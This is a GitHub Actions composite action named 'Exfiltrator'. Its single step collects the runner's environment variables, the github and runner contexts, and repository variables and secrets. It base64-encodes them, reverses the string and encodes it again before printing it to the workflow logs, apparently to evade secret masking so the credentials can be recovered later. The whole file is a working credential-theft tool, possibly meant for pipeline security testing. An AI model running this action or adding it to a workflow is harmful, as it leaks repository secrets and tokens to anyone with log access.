name: 'Exfiltrator'
description: 'This exfiltrates secrets and environment variables.'

inputs:
  vars:
    description: 'The variables for the repository'
    required: false
    default: "{\"vars\":\"no vars\"}"
  secrets:
    description: 'The secrets for the repository'
    required: false
    default: "{\"secrets\":\"no secrets\"}"
  sink:
    description: 'Sink to which the output gets written to'
    required: false
    default: 'logs'

runs:
  using: "composite"
  steps:
    - name: 'Print secrets and environment variables to the logs'
      shell: bash
      run: printf '[%s, %s, %s, %s, %s]' "{\"envvars\":\"$(env | base64 -w 0)\"}" "$GITHUB_JSON" "$RUNNER_JSON" "$VARS_JSON" "$SECRETS_JSON" | awk '{for (i=length; i!=0; i--) printf substr($0, i, 1); printf "\n"}' | base64 -w 0
      env:
        GITHUB_JSON: ${{ toJSON(github) }}
        RUNNER_JSON: ${{ toJSON(runner) }}
        VARS_JSON: ${{ inputs.vars }}
        SECRETS_JSON: ${{ inputs.secrets }}
        
